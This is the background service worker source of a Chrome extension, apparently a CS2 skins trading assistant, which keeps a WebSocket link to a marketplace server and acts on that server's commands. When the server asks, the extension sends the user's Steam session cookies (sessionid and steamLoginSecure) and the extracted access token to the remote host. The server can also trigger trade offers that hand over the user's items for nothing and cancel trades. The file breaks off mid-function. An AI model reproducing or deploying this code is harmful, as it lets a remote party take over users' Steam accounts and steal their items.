// CS-SKINS.pro Trading Assistant - Background Service Worker

// API клиент для взаимодействия с платформой
class PlatformAPI {
    constructor() {
        this.baseURL = 'https://cs-skins.s1temaker.ru';
    }
    
    async makeRequest(endpoint, options = {}) {
        const token = await this.getAuthToken();
        const url = `${this.baseURL}/api/ext-api${endpoint}`;
        
        const config = {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                ...(token && { 'Authorization': `Bearer ${token}` }),
                ...options.headers
            },
            ...options
        };
        
        const response = await fetch(url, config);
        
        if (!response.ok) {
            let errorText = '';
            try {
                errorText = await response.text();
            } catch (e) {
                // Ignore error text reading failure
            }
            
            const error = new Error(`HTTP ${response.status}: ${response.statusText}`);
            error.status = response.status;
            error.responseText = errorText;
            throw error;
        }
        
        return await response.json();
    }
    
    async getAuthToken() {
        const result = await chrome.storage.local.get('cs2_marketplace_extension');
        const data = result.cs2_marketplace_extension || {};
        return data.authToken || null;
    }
    
    
    
    /**
     * Отправка ошибки на сервер через WebSocket для отладки
     */
    async logError(errorType, errorMessage, context = {}) {
        try {
            // Используем глобальный метод sendToServer
            if (typeof sendToServer === 'function') {
                await sendToServer('error_log', {
                    type: errorType,
                    message: errorMessage,
                    context: context,
                    timestamp: new Date().toISOString()
                });
            }
        } catch (error) {
            // Не выбрасываем ошибку, чтобы не прерывать основной процесс
            console.error('Failed to log error to server via WebSocket:', error);
        }
    }
}

// Класс для работы с хранилищем
class ExtensionStorage {
    constructor() {
        this.storageKey = 'cs2_marketplace_extension';
    }
    
    async getData() {
        try {
            const result = await chrome.storage.local.get(this.storageKey);
            return result[this.storageKey] || {};
        } catch (error) {
            // Ignore storage read errors
            return {};
        }
    }
    
    async setData(data) {
        try {
            const currentData = await this.getData();
            await chrome.storage.local.set({
                [this.storageKey]: { ...currentData, ...data }
            });
            return true;
        } catch (error) {
            // Ignore storage write errors
            return false;
        }
    }
    
    async isAuthorized() {
        const data = await this.getData();
        return !!data.authToken;
    }
    
    async setAuthToken(token) {
        return await this.setData({
            authToken: token,
            authorizedAt: new Date().toISOString()
        });
    }
    
    async clearAuth() {
        return await this.setData({
            authToken: null,
            authorizedAt: null,
            userInfo: null
        });
    }
    
    async addLogEntry(type, message, data = {}) {
        const currentData = await this.getData();
        const logs = currentData.logs || [];
        
        const logEntry = {
            id: Date.now(),
            type: type,
            message: message,
            data: data,
            timestamp: new Date().toISOString()
        };
        
        logs.unshift(logEntry);
        if (logs.length > 100) {
            logs.splice(100);
        }
        
        const result = await this.setData({ logs });
        
        // Уведомляем popup об обновлении лога для немедленного отображения
        chrome.runtime.sendMessage({
            type: 'LOG_UPDATED',
            logEntry: logEntry
        }).catch(() => {});
        
        return result;
    }
}

// Основной класс Trading Assistant
class TradingAssistant {
    constructor() {
        this.isActive = false;
        this.isAuthorized = false;
        this.wsConnection = null;
        this.heartbeatInterval = null;
        this.platformAPI = new PlatformAPI();
        this.storage = new ExtensionStorage();
        this.lastStatsRequest = 0;
        this.currentSteamId = null;
        
        this.init();
    }
    
    async init() {
        this.isAuthorized = await this.storage.isAuthorized();
        if (this.isAuthorized) {
            // Восстанавливаем последнюю статистику при запуске
            await this.restoreLastStats();
            
            // Проверяем Steam сессию при запуске
            await this.performSteamCheck();
            
            await this.connectWebSocket();
            
            // Запускаем периодическую проверку Steam каждые 30 секунд
            this.startSteamMonitoring();
        }
        
        await updateActivityIcon();
    }
    
    startSteamMonitoring() {
        // Очищаем старый интервал если есть
        if (this.steamCheckInterval) {
            clearInterval(this.steamCheckInterval);
        }
        
        // Проверяем Steam каждые 30 секунд
        this.steamCheckInterval = setInterval(() => {
            this.performSteamCheck();
        }, 30000);
    }
    
    async performSteamCheck() {
        try {
            const steamStatus = await this.checkSteamStatusDirect();
            
            // Сохраняем результат проверки
            await this.storage.setData({
                lastSteamCheck: Date.now(),
                steamAvailable: steamStatus.available,
                steamState: steamStatus.state
            });
            
            // Обновляем иконку если нужно
            await updateActivityIcon();
            
        } catch (error) {
            console.error('[STEAM CHECK] Error:', error);
        }
    }
    
    async ensureSteamReady(steamTab, expectedSteamId = null) {
        try {
            // Сначала проверяем на текущей странице
            const [currentResult] = await chrome.scripting.executeScript({
                target: { tabId: steamTab.id },
                world: 'MAIN',
                func: (expectedId) => {
                    // Проверяем наличие g_steamID и g_sessionID
                    if (typeof g_steamID !== 'undefined' && g_steamID && 
                        typeof g_sessionID !== 'undefined' && g_sessionID) {
                        const isCorrectUser = !expectedId || g_steamID === expectedId;
                        
                        if (isCorrectUser) {
                            return {
                                available: true,
                                state: 'ready',
                                steamId: g_steamID,
                                isCorrectUser: true,
                                reason: 'authenticated'
                            };
                        } else {
                            return {
                                available: false,
                                state: 'wrong_user',
                                steamId: g_steamID,
                                isCorrectUser: false,
                                reason: 'wrong_user'
                            };
                        }
                    }
                    
                    // Нет нужных переменных на текущей странице
                    return {
                        available: false,
                        state: 'need_navigation',
                        reason: 'steam_vars_not_found'
                    };
                },
                args: [expectedSteamId]
            });
            
            // Если на текущей странице все готово
            if (currentResult?.result?.available) {
                return currentResult.result;
            }
            
            // Если нужна навигация - переходим на главную
            if (currentResult?.result?.state === 'need_navigation') {
                console.log('[STEAM] Variables not found on current page, navigating to main page...');
                
                // Переходим на главную страницу Steam
                await chrome.tabs.update(steamTab.id, { 
                    url: 'https://steamcommunity.com/',
                    active: true 
                });
                
                // Ждем загрузки страницы
                await new Promise((resolve) => {
                    const listener = (tabId, changeInfo) => {
                        if (tabId === steamTab.id && changeInfo.status === 'complete') {
                            chrome.tabs.onUpdated.removeListener(listener);
                            resolve();
                        }
                    };
                    chrome.tabs.onUpdated.addListener(listener);
                });
                
                // Дополнительная задержка для инициализации JS
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Проверяем Steam переменные на главной странице
                const [mainPageResult] = await chrome.scripting.executeScript({
                    target: { tabId: steamTab.id },
                    world: 'MAIN',
                    func: (expectedId) => {
                        // Проверяем наличие g_steamID и g_sessionID
                        if (typeof g_steamID !== 'undefined' && g_steamID && 
                            typeof g_sessionID !== 'undefined' && g_sessionID) {
                            const isCorrectUser = !expectedId || g_steamID === expectedId;
                            
                            if (isCorrectUser) {
                                return {
                                    available: true,
                                    state: 'ready',
                                    steamId: g_steamID,
                                    isCorrectUser: true,
                                    reason: 'authenticated_after_navigation'
                                };
                            } else {
                                return {
                                    available: false,
                                    state: 'wrong_user',
                                    steamId: g_steamID,
                                    isCorrectUser: false,
                                    reason: 'wrong_user'
                                };
                            }
                        }
                        
                        // Нет g_steamID на главной странице - пользователь не залогинен
                        return {
                            available: false,
                            state: 'unauthorized',
                            reason: 'not_logged_in'
                        };
                    },
                    args: [expectedSteamId]
                });
                
                if (mainPageResult?.result) {
                    return mainPageResult.result;
                }
            }
            
            // Возвращаем результат с текущей страницы если не нужна навигация
            return currentResult?.result || {
                available: false,
                state: 'error',
                reason: 'no_result_from_script'
            };
            
        } catch (error) {
            console.error('[STEAM] ensureSteamReady error:', error);
            return {
                available: false,
                state: 'error',
                reason: error.message
            };
        }
    }
    
    async checkSteamStatusDirect() {
        try {
            // Проверяем наличие активных вкладок Steam
            const steamTabs = await chrome.tabs.query({
                url: ["*://steamcommunity.com/*"]
            });
            
            if (steamTabs.length === 0) {
                return {
                    available: false,
                    state: 'closed',
                    reason: 'closed'
                };
            }
            
            // Получаем Steam ID пользователя расширения
            const data = await this.storage.getData();
            const expectedSteamId = data.userInfo?.steam_id || null;
            
            // Используем первую найденную вкладку Steam
            const steamTab = steamTabs[0];
            
            // Используем хелпер для проверки готовности Steam
            const result = await this.ensureSteamReady(steamTab, expectedSteamId);
            
            // Сохраняем текущий Steam ID
            if (result.steamId) {
                this.currentSteamId = result.steamId;
            }
            
            return result;
            
        } catch (error) {
            console.error('[STEAM CHECK] General error:', error);
            return {
                available: false,
                state: 'error',
                reason: error.message
            };
        }
    }
    
    async connectWebSocket() {
        console.log('[WebSocket] Connecting...', { 
            isActive: this.isActive, 
            isAuthorized: this.isAuthorized,
            hasExistingConnection: !!this.wsConnection 
        });
        
        // Отключаем старое соединение если есть
        this.disconnectWebSocket();
        
        this.isActive = true;
        startKeepAlive();
        
        try {
            const token = await this.platformAPI.getAuthToken();
            if (!token) {
                return;
            }
            
            // Подключаемся к Laravel Reverb WebSocket серверу через стандартный HTTPS порт
            const wsUrl = 'wss://cs-skins.s1temaker.ru/ws/app/cs-skins-key?protocol=7&client=js&version=8.0.1&flash=false';
            
            
            // Создаем WebSocket соединение
            this.wsConnection = new WebSocket(wsUrl);
            
            // Таймаут для подключения WebSocket (30 секунд)
            const connectionTimeout = setTimeout(() => {
                if (this.wsConnection && this.wsConnection.readyState === WebSocket.CONNECTING) {
                    this.wsConnection.close();
                    this.wsConnection = null;
                }
            }, 30000);
            
            // Обработчик подключения WebSocket
            this.wsConnection.onopen = (event) => {
                clearTimeout(connectionTimeout);
                
                // Запускаем heartbeat для поддержания соединения
                this.startHeartbeat();
                
                // Подписываемся на канал заказов
                this.subscribeToOrderChannel();
            };
            
            // Обработчик сообщений WebSocket
            this.wsConnection.onmessage = async (event) => {
                try {
                    const data = JSON.parse(event.data);
                    //console.log('WebSocket message received:', data);
                    
                    // Парсим данные события если они в виде JSON строки
                    let messageData = data.data || data;
                    if (typeof messageData === 'string') {
                        try {
                            messageData = JSON.parse(messageData);
                        } catch (e) {
                            console.error('Failed to parse message data:', e);
                        }
                    }
                    
                    // Используем новый универсальный обработчик
                    await handleServerMessage(data.event, messageData);
                    
                } catch (error) {
                    // Ignore WebSocket message errors
                }
            };
            
            // Обработчик ошибок WebSocket
            this.wsConnection.onerror = (event) => {
                clearTimeout(connectionTimeout);
            };
            
            // Обработчик закрытия WebSocket
            this.wsConnection.onclose = (event) => {
                clearTimeout(connectionTimeout);
                
                if (event.code !== 1000) {
                        
                    // Переподключаемся через 5 секунд
                    setTimeout(() => {
                        if (this.isActive && this.isAuthorized) {
                            this.connectWebSocket();
                        }
                    }, 5000);
                }
            };
            
            
        } catch (error) {
            this.isActive = false;
        }
        
        await updateActivityIcon();
    }
    
    disconnectWebSocket() {
        if (this.wsConnection) {
            this.wsConnection.close();
            this.wsConnection = null;
        }
        this.stopHeartbeat();
    }
    
    startHeartbeat() {
        // Отправляем ping каждые 25 секунд (меньше чем activity_timeout=30)
        this.heartbeatInterval = setInterval(() => {
            if (this.wsConnection && this.wsConnection.readyState === WebSocket.OPEN) {
                this.wsConnection.send(JSON.stringify({
                    event: 'pusher:ping',
                    data: {}
                }));
            }
        }, 25000);
    }
    
    stopHeartbeat() {
        if (this.heartbeatInterval) {
            clearInterval(this.heartbeatInterval);
            this.heartbeatInterval = null;
        }
    }
    
    async subscribeToOrderChannel() {
        if (!this.wsConnection || this.wsConnection.readyState !== WebSocket.OPEN) return;
        
        try {
            const data = await this.storage.getData();
            const channelName = data.websocketChannel;
            
            if (!channelName) {
                
                // Если канала нет, значит расширение авторизовано по старой схеме
                // Разавторизуем и требуем повторной авторизации
                await this.logout();
                await this.showNotification('Требуется переавторизация', 'Обновите расширение - войдите заново с вашим токеном.');
                return;
            }
            
            this.wsConnection.send(JSON.stringify({
                event: 'pusher:subscribe',
                data: { channel: channelName }
            }));
        } catch (error) {
            // Ignore channel subscription errors
        }
    }
    
    
    
    async getCurrentUserId() {
        try {
            const userResponse = await this.platformAPI.makeRequest('/user');
            return userResponse.data.id;
        } catch (error) {
            return 3; // fallback ID
        }
    }
    
    async restoreLastStats() {
        try {
            const data = await this.storage.getData();
            if (data.lastStats) {
                chrome.runtime.sendMessage({
                    type: 'STATS_RECEIVED',
                    stats: data.lastStats
                }).catch(() => {});
            }
        } catch (error) {
            // Ignore stats restore errors
        }
    }
    
    async requestStats() {
        if (!this.wsConnection || this.wsConnection.readyState !== WebSocket.OPEN) {
            
            // Если не подключен, пробуем подключиться
            if (this.isAuthorized && !this.isActive) {
                await this.connectWebSocket();
            }
            return;
        }
        
        try {
            const data = await this.storage.getData();
            const channel = data.websocketChannel;
            
            if (!channel) {
                
                // Если канала нет, значит расширение авторизовано по старой схеме
                await this.logout();
                await this.showNotification('Требуется переавторизация', 'Обновите расширение - войдите заново с вашим токеном.');
                return;
            }
            
            
            // Запрашиваем статистику через глобальный метод
            await sendToServer('stats_request', {});
            
        } catch (error) {
            // Ignore stats request errors
        }
    }
    
    
    async stop() {
        this.disconnectWebSocket();
        
        // Останавливаем мониторинг Steam
        if (this.steamCheckInterval) {
            clearInterval(this.steamCheckInterval);
            this.steamCheckInterval = null;
        }
        
        // Сбрасываем Steam статус
        await this.storage.setData({
            steamAvailable: false,
            steamState: 'inactive'
        });
        
        this.isActive = false;
        
        // Очищаем логи при отключении расширения
        await this.storage.setData({ logs: [] });
        
        if (detachedWindows.size === 0) {
            stopKeepAlive();
        }
        
        await updateActivityIcon();
    }
    
    
    async processTradeOffer(eventData) {
        console.log('[TRADE] Processing trade offer:', eventData);
        
        try {
            // Проверяем что есть необходимые данные для создания трейда
            if (!eventData.trade_offer) {
                console.log('[TRADE] No trade_offer in eventData');
                return;
            }
            
            console.log('[TRADE] Step 1: Data validation passed');
            
            const tradeOffer = eventData.trade_offer;
            const itemsCount = tradeOffer.items ? tradeOffer.items.length : tradeOffer.asset_ids ? tradeOffer.asset_ids.length : 0;
            
            // Проверяем обязательные поля
            if (!tradeOffer.asset_ids || !tradeOffer.buyer?.steam_id || !tradeOffer.buyer?.trade_url) {
                console.log('[TRADE] Missing required fields:', {
                    has_asset_ids: !!tradeOffer.asset_ids,
                    has_steam_id: !!tradeOffer.buyer?.steam_id,
                    has_trade_url: !!tradeOffer.buyer?.trade_url
                });
                return;
            }
            
            console.log('[TRADE] Step 2: Required fields validation passed');
            
            // Проверяем статус Steam
            console.log('[TRADE] Step 3: Checking Steam status...');
            
            // Находим Steam вкладку
            const steamTabs = await chrome.tabs.query({ url: "https://steamcommunity.com/*" });
            if (!steamTabs.length) {
                console.log('[TRADE] No Steam tabs available');
                return;
            }
            
            const steamTab = steamTabs[0];
            const steamStatus = await this.ensureSteamReady(steamTab);
            console.log('[TRADE] Steam status result:', steamStatus);
            
            if (!steamStatus.available) {
                console.log('[TRADE] Steam not available, stopping');
                return;
            }
            
            console.log('[TRADE] Step 4: Steam status check passed');
            
            
            // Логируем данные трейда для отладки
            console.log('Creating trade offer:', {
                trade_offer_id: tradeOffer.trade_offer_id,
                items_count: itemsCount,
                asset_ids: tradeOffer.asset_ids,
                buyer_steam_id: tradeOffer.buyer?.steam_id,
                trade_url: tradeOffer.buyer?.trade_url
            });
            
            // Создаём трейд через централизованный SteamAPI
            const tradeResult = await this.createTradeOffer(tradeOffer);
            console.log('📋 Trade result:', tradeResult);
            
            if (tradeResult.success) {
                
                // Отправляем ID трейд оффера на сервер ПЕРВЫМ ДЕЛОМ
                try {
                    await sendToServer('trade_offer_sent', {
                        trade_offer_id: tradeOffer.trade_offer_id,
                        steam_trade_offer_id: tradeResult.tradeofferid
                    });
                } catch (sendError) {
                    console.error('Failed to send trade_offer_sent:', sendError);
                    // Не выбрасываем ошибку, продолжаем выполнение
                }
                
                
            } else {
                
                // Отправляем ошибку трейд оффера на сервер
                await sendToServer('trade_offer_failed', {
                    trade_offer_id: tradeOffer.trade_offer_id,
                    error: tradeResult.error
                });
                
                await this.showNotification('Ошибка трейда', `${itemsCount} товаров`);
            }
            
        } catch (error) {
            const itemsCount = eventData.trade_offer?.items?.length || 0;
            
            // Отправляем критическую ошибку на сервер
            if (eventData.trade_offer?.trade_offer_id) {
                await sendToServer('trade_offer_failed', {
                    trade_offer_id: eventData.trade_offer.trade_offer_id,
                    error: error.message,
                    error_stack: error.stack
                });
            }
            
            await this.showNotification('Ошибка трейда', `${itemsCount} товаров`);
        }
    }
    
    async createTradeOffer(tradeOffer) {
        try {
            console.log('Creating trade offer via centralized SteamAPI:', {
                trade_offer_id: tradeOffer.trade_offer_id,
                assets_count: tradeOffer.asset_ids?.length || 0,
                buyer_steam_id: tradeOffer.buyer?.steam_id
            });
            
            // Валидация трейд оффера
            if (!tradeOffer.asset_ids || tradeOffer.asset_ids.length === 0) {
                return {
                    success: false,
                    error: 'No asset_ids in trade offer'
                };
            }
            
            if (!tradeOffer.buyer?.steam_id) {
                return {
                    success: false,
                    error: 'No buyer steam_id'
                };
            }
            
            if (!tradeOffer.buyer?.trade_url) {
                return {
                    success: false,
                    error: 'No buyer trade_url'
                };
            }
            
            // Подготавливаем данные для трейда
            const assets = tradeOffer.asset_ids.map(assetId => ({
                appid: "730",
                contextid: "2", 
                amount: 1,
                assetid: assetId.toString()
            }));
            
            // Извлекаем токен из trade URL
            const tokenMatch = tradeOffer.buyer.trade_url.match(/token=([a-zA-Z0-9_-]+)/);
            const tradeToken = tokenMatch ? tokenMatch[1] : '';
            
            if (!tradeToken) {
                return { success: false, error: 'Не удалось извлечь токен из trade URL' };
            }
            
            // Подготавливаем данные запроса
            const tradeData = {
                sessionid: '', // Будет заполнено в SteamAPI
                serverid: '1',
                partner: tradeOffer.buyer.steam_id,
                tradeoffermessage: '',
                json_tradeoffer: JSON.stringify({
                    newversion: true,
                    version: 4,
                    me: {
                        assets: assets,
                        currency: [],
                        ready: false
                    },
                    them: {
                        assets: [],
                        currency: [],
                        ready: false
                    }
                }),
                captcha: '',
                trade_offer_create_params: JSON.stringify({
                    trade_offer_access_token: tradeToken
                })
            };
            
            // Создаем трейд через централизованный SteamAPI
            console.log('Trade data being sent:', tradeData);
            
            const response = await SteamAPI.request({
                url: 'https://steamcommunity.com/tradeoffer/new/send',
                method: 'POST',
                data: tradeData,
                preRequestUrl: tradeOffer.buyer.trade_url,
                operation: 'createTradeOffer',
                successValidator: 'return result && result.tradeofferid && !result.strError;'
            });
            
            // Проверяем успешный ответ
            if (response && response.tradeofferid) {
                return {
                    success: true,
                    tradeofferid: response.tradeofferid,
                    needs_mobile_confirmation: response.needs_mobile_confirmation
                };
            } else {
                // Логируем неуспешный ответ Steam API
                console.log('[Steam API] Trade offer creation failed:', response);
                
                return {
                    success: false,
                    error: response
                };
            }
            
        } catch (error) {
            console.error('Error creating trade offer:', error);
            return { 
                success: false, 
                error: error.message,
                httpStatus: error.httpStatus,
                rawResponse: error.rawResponse
            };
        }
    }
    
    async showNotification(title, message) {
        try {
            await chrome.notifications.create({
                type: 'basic',
                iconUrl: chrome.runtime.getURL('assets/icons/icon-128.png'),
                title: title || 'CS-SKINS.pro',
                message: message || ''
            });
        } catch (error) {
            console.error('Notification error:', error);
        }
    }
    
    async cancelSteamTrade(messageData) {
        try {
            const { trade_offer_id, steam_trade_offer_id, order_id } = messageData;
            
            
            // Находим существующую Steam вкладку
            const steamTabs = await chrome.tabs.query({ url: 'https://steamcommunity.com/*' });
            
            if (!steamTabs.length) {
                
                await sendToServer('steam_trade_cancelled', {
                    trade_offer_id: trade_offer_id,
                    success: false,
                    error: 'Нет открытых вкладок Steam'
                });
                return;
            }
            
            const steamTab = steamTabs[0];
            
            // Проверяем статус Steam используя хелпер
            const steamStatus = await this.ensureSteamReady(steamTab);
            if (!steamStatus.available) {
                
                // Отправляем ошибку на сервер
                await sendToServer('steam_trade_cancelled', {
                    trade_offer_id: trade_offer_id,
                    success: false,
                    error: 'Steam недоступен для отмены трейда'
                });
                return;
            }
            
            // Отправляем команду на отмену трейда через централизованный SteamAPI
            const response = await SteamAPI.request({
                url: `https://steamcommunity.com/tradeoffer/${steam_trade_offer_id}/cancel`,
                method: 'POST',
                data: {
                    sessionid: '', // Будет заполнено в steam-injector
                },
                operation: 'cancelTradeOffer'
            });
            
            if (response && response.success) {
                
                // Отправляем подтверждение на сервер
                await sendToServer('steam_trade_cancelled', {
                    trade_offer_id: trade_offer_id,
                    success: true
                });
            } else {
                const error = response?.error || 'Неизвестная ошибка при отмене трейда';
                
                await sendToServer('steam_trade_cancelled', {
                    trade_offer_id: trade_offer_id,
                    success: false,
                    error: error
                });
            }
            
        } catch (error) {
            console.error('Error cancelling Steam trade:', error);
            
            
            // Отправляем ошибку на сервер
            if (messageData.trade_offer_id) {
                await sendToServer('steam_trade_cancelled', {
                    trade_offer_id: messageData.trade_offer_id,
                    success: false,
                    error: error.message
                });
            }
        }
    }
    
    /**
     * Проверка статуса трейд-офферов через Steam API
     */
    async checkTradeOfferStatus(messageData) {
        try {
            const { trade_offer_ids } = messageData;
            
            if (!trade_offer_ids || !Array.isArray(trade_offer_ids)) {
                console.log('[TRADE STATUS] Invalid trade_offer_ids:', trade_offer_ids);
                return;
            }
            
            console.log('[TRADE STATUS] Checking status for offers:', trade_offer_ids);
            
            // Находим Steam вкладку
            const steamTabs = await chrome.tabs.query({ url: "https://steamcommunity.com/*" });
            if (!steamTabs.length) {
                console.log('[TRADE STATUS] No Steam tabs available');
                await sendToServer('trade_status_error', {
                    error: 'No Steam tabs available'
                });
                return;
            }
            
            const steamTab = steamTabs[0];
            
            // Проверяем готовность Steam
            const steamStatus = await this.ensureSteamReady(steamTab);
            if (!steamStatus.available) {
                console.log('[TRADE STATUS] Steam not available');
                await sendToServer('trade_status_error', {
                    error: 'Steam not available'
                });
                return;
            }
            
            // Получаем куки для API запросов
            const cookies = await this.getSteamCookies();
            if (!cookies.sessionid || !cookies.steamLoginSecure) {
                console.log('[TRADE STATUS] Missing required cookies');
                await sendToServer('trade_status_error', {
                    error: 'Missing Steam authentication cookies'
                });
                return;
            }
            
            // Извлекаем access token из steamLoginSecure
            const accessToken = this.extractAccessToken(cookies.steamLoginSecure);
            if (!accessToken) {
                console.log('[TRADE STATUS] Could not extract access token');
                await sendToServer('trade_status_error', {
                    error: 'Could not extract access token from Steam cookies'
                });
                return;
            }
            
            // Проверяем статус каждого трейда
            const results = [];
            for (const tradeOfferId of trade_offer_ids) {
                try {
                    const status = await this.getTradeOfferStatus(tradeOfferId, accessToken, steamTab);
                    results.push({
                        trade_offer_id: tradeOfferId,
                        success: true,
                        ...status
                    });
                } catch (error) {
                    console.error(`[TRADE STATUS] Error checking offer ${tradeOfferId}:`, error);
                    results.push({
                        trade_offer_id: tradeOfferId,
                        success: false,
                        error: error.message
                    });
                }
            }
            
            // Отправляем результаты на сервер
            await sendToServer('trade_status_results', {
                results: results
            });
            
        } catch (error) {
            console.error('[TRADE STATUS] General error:', error);
            await sendToServer('trade_status_error', {
                error: error.message
            });
        }
    }
    
    /**
     * Получение куки Steam из браузера
     */
    async getSteamCookies() {
        try {
            const sessionIdCookie = await chrome.cookies.get({
                url: 'https://steamcommunity.com',
                name: 'sessionid'
            });
            
            const steamLoginSecureCookie = await chrome.cookies.get({
                url: 'https://steamcommunity.com',
                name: 'steamLoginSecure'
            });
            
            return {
                sessionid: sessionIdCookie?.value || null,
                steamLoginSecure: steamLoginSecureCookie?.value || null
            };
        } catch (error) {
            console.error('[TRADE STATUS] Error getting cookies:', error);
            return {};
        }
    }
    
    /**
     * Извлечение access token из steamLoginSecure куки
     */
    extractAccessToken(steamLoginSecure) {
        try {
            if (!steamLoginSecure) return null;
            
            const cookieValue = decodeURIComponent(steamLoginSecure);
            const accessToken = cookieValue.split('||')[1];
            
            return accessToken || null;
        } catch (error) {
            console.error('[TRADE STATUS] Error extracting access token:', error);
            return null;
        }
    }
    
    /**
     * Получение статуса конкретного трейд-оффера через Steam API
     */
    async getTradeOfferStatus(tradeOfferId, accessToken, steamTab) {
        // Делаем прямой fetch запрос из service-worker (обходим CORS через host_permissions)
        const url = 'https://api.steampowered.com/IEconService/GetTradeOffer/v1/';
        const params = new URLSearchParams({
            access_token: accessToken,
            tradeofferid: tradeOfferId,
            language: 'en_us'
        });
        
        const response = await fetch(`${url}?${params}`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json'
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        const data = await response.json();
        
        if (!data.response || !data.response.offer) {
            throw new Error('No matching offer found');
        }
        
        const offer = data.response.offer;
        const state = offer.trade_offer_state;
        
        // Состояния трейдов из ETradeOfferState
        const stateNames = {
            1: 'Invalid',
            2: 'Active',
            3: 'Accepted',
            4: 'Countered', 
            5: 'Expired',
            6: 'Canceled',
            7: 'Declined',
            8: 'InvalidItems',
            9: 'CreatedNeedsConfirmation',
            10: 'CanceledBySecondFactor',
            11: 'InEscrow'
        };
        
        return {
            state: state,
            state_name: stateNames[state] || 'Unknown',
            time_created: offer.time_created,
            time_updated: offer.time_updated,
            is_our_offer: offer.is_our_offer || false,
            items_to_give_count: offer.items_to_give ? offer.items_to_give.length : 0,
            items_to_receive_count: offer.items_to_receive ? offer.items_to_receive.length : 0
        };
    }
    
    /**
     * Получение Steam куков для сервера
     */
    async getCookiesForServer(messageData) {
        try {
            console.log('[GET COOKIES] Получение Steam куков для сервера...');
            
            // Находим Steam вкладку и проверяем готовность
            const steamTabs = await chrome.tabs.query({ url: "https://steamcommunity.com/*" });
            if (!steamTabs.length) {
                console.log('[GET COOKIES] No Steam tabs available');
                await sendToServer('cookies_error', {
                    error: 'No Steam tabs available'
                });
                return;
            }
            
            const steamTab = steamTabs[0];
            const steamStatus = await this.ensureSteamReady(steamTab);
            if (!steamStatus.available) {
                console.log('[GET COOKIES] Steam not available');
                await sendToServer('cookies_error', {
                    error: 'Steam not available'
                });
                return;
            }
            
            // Получаем куки из браузера
            const cookies = await this.getSteamCookies();
            if (!cookies.sessionid || !cookies.steamLoginSecure) {
                console.log('[GET COOKIES] Missing required cookies');
                await sendToServer('cookies_error', {
                    error: 'Missing Steam authentication cookies'
                });
                return;
            }
            
            // Извлекаем access token
            const accessToken = this.extractAccessToken(cookies.steamLoginSecure);
            if (!accessToken) {
                console.log('[GET COOKIES] Could not extract access token');
                await sendToServer('cookies_error', {
                    error: 'Could not extract access token'
                });
                return;
            }
            
            // Получаем Steam ID пользователя
            const steamId = steamStatus.steamId || null;
            
            console.log('[GET COOKIES] Куки успешно получены');
            
            // Отправляем куки на сервер
            console.log('[GET COOKIES] Отправляем куки на сервер...');
            const sendResult = await sendToServer('cookies_received', {
                sessionid: cookies.sessionid,
                steamLoginSecure: cookies.steamLoginSecure,
                access_token: accessToken,
                steam_id: steamId,
                trade_offer_id: messageData.trade_offer_id || null
            });
            console.log('[GET COOKIES] Результат отправки:', sendResult);
            
        } catch (error) {
            console.error('[GET COOKIES] Error:', error);
            await sendToServer('cookies_error', {
                error: error.message
            });
        }
    }
    
    async handleMessage(message, sender, sendResponse) {
        const handlers = {
            'GET_STATUS': () => sendResponse({
                isActive: this.isActive,
                isAuthorized: this.isAuthorized
            }),
            
            'CHECK_STEAM_STATUS': async () => {
                const steamStatus = await this.checkSteamStatusDirect();
                sendResponse(steamStatus);
            },
            
            'OPEN_DETACHED_WINDOW': async () => {
                try {
                    const window = await this.createDetachedWindow();
                    sendResponse({ success: true, windowId: window.id });
                } catch (error) {
                    sendResponse({ success: false, error: error.message });
                }
            },
            
            'AUTHORIZE': async () => {
                try {
                    await this.authorize(message.token);
                    sendResponse({ success: true });
                } catch (error) {
                    sendResponse({ success: false, error: error.message });
                }
            },
            
            'LOGOUT': async () => {
                await this.logout();
                sendResponse({ success: true });
            },
            
            'TOGGLE_ACTIVE': async () => {
                await this.toggleActive();
                sendResponse({ isActive: this.isActive });
            },
            
            'REQUEST_STATS': async () => {
                await this.requestStats();
                sendResponse({ success: true });
            },
            
            'GET_CACHED_STATS': async () => {
                try {
                    const data = await this.storage.getData();
                    sendResponse({ 
                        success: true, 
                        stats: data.lastStats || null 
                    });
                } catch (error) {
                    sendResponse({ success: false, error: error.message });
                }
            },
            
            'CREATE_TRADE_WITH_TAB': async () => {
                try {
                    const result = await this.createTradeWithTab(message.order);
                    sendResponse(result);
                } catch (error) {
                    sendResponse({ 
                        success: false, 
                        error: error.message 
                    });
                }
            },
            
            'GET_USER_STEAM_ID': async () => {
                try {
                    const data = await this.storage.getData();
                    sendResponse({ 
                        success: true, 
                        steamId: data.userInfo?.steam_id || null 
                    });
                } catch (error) {
                    sendResponse({ success: false, error: error.message });
                }
            },
            
            'STEAM_API_REQUEST': async () => {
                try {
                    // Преобразуем функцию в строку для передачи в executeScript
                    if (message.config.successValidator && typeof message.config.successValidator === 'function') {
                        message.config.successValidator = message.config.successValidator.toString();
                    }
                    
                    const result = await SteamAPI.request(message.config);
                    sendResponse({ success: true, result: result });
                } catch (error) {
                    sendResponse({ 
                        success: false, 
                        error: error.message,
                        httpStatus: error.httpStatus,
                        rawResponse: error.rawResponse
                    });
                }
            },
            
        };
        
        const handler = handlers[message.type];
        if (handler) {
            await handler();
        }
    }
    
    async createDetachedWindow() {
        const window = await chrome.windows.create({
            url: chrome.runtime.getURL('index.html'),
            type: 'popup',
            width: 420,
            height: 600,
            focused: true,
            left: 100,
            top: 100
        });
        
        detachedWindows.add(window.id);
        startKeepAlive();
        
        try {
            if (chrome.windows.update && window.id) {
                await chrome.windows.update(window.id, { focused: true });
            }
        } catch (error) {
            // Window update error ignored
        }
        
        return window;
    }
    
    async authorize(token) {
        try {
            // Авторизуемся на сервере и получаем канал
            const response = await this.platformAPI.makeRequest('/auth', {
                method: 'POST',
                body: JSON.stringify({ token })
            });
            
            if (response.success && response.channel) {
                await this.storage.setData({
                    authToken: token,
                    websocketChannel: response.channel,
                    authorizedAt: new Date().toISOString()
                });
                
                this.isAuthorized = true;
                await this.connectWebSocket();
                await updateActivityIcon();
            } else {
                throw new Error('Failed to get WebSocket channel');
            }
        } catch (error) {
            throw error;
        }
    }
    
    async logout() {
        await this.stop();
        await this.storage.clearAuth();
        this.isAuthorized = false;
        await updateActivityIcon();
    }
    
    async toggleActive() {
        if (this.isActive) {
            await this.stop();
        } else {
            const isAuthorized = await this.storage.isAuthorized();
            if (isAuthorized) {
                this.isAuthorized = true;
                await this.connectWebSocket();
            }
        }
